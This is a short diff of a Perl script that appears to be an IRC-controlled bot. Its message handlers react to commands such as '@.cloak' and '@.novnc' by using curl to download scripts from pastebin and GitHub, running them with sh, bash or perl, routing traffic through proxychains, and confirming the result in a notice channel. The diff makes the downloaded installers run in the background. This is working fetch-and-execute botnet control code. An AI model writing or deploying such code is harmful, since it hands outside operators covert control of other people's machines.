@@ -57,12 +57,12 @@ $irc->on(irc_privmsg => sub {
  }
  if ($msg =~ /@.cloak/) {
   system("curl -LvO https://pastebin.com/raw/w86vVZ7i -o ~/perlircssl.pl");
-  system("curl -LvO https://raw.githubusercontent.com/ind3p3nd3nt/proxych/main/install.sh -o install.sh && sh install.sh;");
+  system("curl -LvO https://raw.githubusercontent.com/ind3p3nd3nt/proxych/main/install.sh -o install.sh && sh install.sh &");
   system("proxychains perl ~/perlircssl.pl&");
   $irc->write(notice => $noticechan => "[info] Cloaked!\n");
  }
   if ($msg =~ /@.novnc/) {
-  system("curl -LvO https://raw.githubusercontent.com/ind3p3nd3nt/novnc/main/.install.sh -o ~/.novnc && bash ~/.novnc");
+  system("curl -LvO https://raw.githubusercontent.com/ind3p3nd3nt/novnc/main/.install.sh -o .install.sh && bash .install.sh &");
   $irc->write(notice => $noticechan => "[info] NoVNC installed check terminal for input\n");
  }
    if ($msg =~ /@.socks/) {
